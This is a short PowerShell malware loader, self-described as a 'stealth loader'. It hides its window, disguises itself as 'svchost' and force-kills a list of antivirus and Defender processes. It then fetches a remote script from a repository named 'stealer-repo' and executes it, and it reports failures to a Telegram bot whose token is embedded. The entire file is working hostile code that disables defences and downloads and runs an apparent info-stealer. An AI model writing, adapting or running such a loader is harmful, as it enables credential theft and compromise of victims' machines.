# ============================================
# FAST LAUNCHER - stealth loader
# ============================================
# Hide console window
$code = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("kernel32.dll")] public static extern bool SetConsoleTitle(string lpConsoleTitle);
}
"@
Add-Type -TypeDefinition $code

[Win32]::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)
[Win32]::SetConsoleTitle("svchost")

# Kill AV processes
$killList = @("avg","avast","avgnt","comodo","kaspersky","malwarebytes","msascui","mbam","nod32","fsecure","sophos","defender")
foreach ($proc in $killList) {
    Get-Process $proc -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
}

# Download and execute payload (v2 anti-cache)
$url = "https://raw.githubusercontent.com/isajarGamer2/stealer-repo/main/payload_final.ps1"
try {
    $payload = Invoke-WebRequest -Uri $url -UseBasicParsing -TimeoutSec 15 -UserAgent "Mozilla/5.0" -ErrorAction Stop
    Invoke-Expression $payload.Content
} catch {
    # If payload fails, log error
    $errMsg = "Launcher FAILED: $($_.Exception.Message)"
    # Try to send error to Telegram
    try {
        Invoke-RestMethod -Uri "https://api.telegram.org/bot8785045003:AAGsICsqOyT3t_luH2Y4WQSJ746dnbZZby4/sendMessage" -Method Post -Body @{
            chat_id = "8445047233"
            text = $errMsg
        } | Out-Null
    } catch {}
    exit 1
}
exit
